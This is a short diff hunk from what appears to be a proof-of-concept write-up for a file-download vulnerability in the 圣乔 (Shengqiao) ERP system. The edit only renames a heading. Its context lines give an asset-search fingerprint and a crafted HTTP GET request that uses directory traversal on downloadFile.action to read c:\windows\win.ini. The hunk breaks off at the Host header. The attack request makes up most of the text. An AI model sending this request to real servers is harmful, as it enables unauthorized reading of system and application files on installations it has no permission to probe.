@@ -7,7 +7,7 @@
 app="圣乔-ERP系统"
 ```
 
-## poc
+## POC
 ```javascript
 GET /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini HTTP/1.1
 Host: 
